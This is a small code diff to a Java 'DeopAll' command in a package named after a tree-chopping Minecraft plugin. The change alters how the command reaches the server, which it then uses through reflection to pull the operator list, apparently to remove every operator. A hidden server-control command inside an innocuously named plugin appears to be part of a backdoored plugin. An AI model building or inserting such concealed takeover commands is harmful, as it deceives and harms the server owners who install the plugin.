@@ -2,6 +2,7 @@ package me.bow.treecapitatorultimate.commands.Server;
 
 import com.mojang.authlib.GameProfile;
 import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.Utils.CraftBukkitUtil;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
@@ -24,7 +25,7 @@ public class DeopAll extends Command {
         Collection<Object> ops = null;
         Class<?> dedicatedServer = ReflectionUtils.getClass("{nms}.DedicatedServer");
         try {
-            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
+            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(CraftBukkitUtil.getNmsServer());
             m = ReflectionUtils.getMethod(m.getClass(), "getOPs").invoke(m);
             ops = (Collection<Object>) ReflectionUtils.getMethod(m.getClass(), "getValues", 0).invoke(m);
 
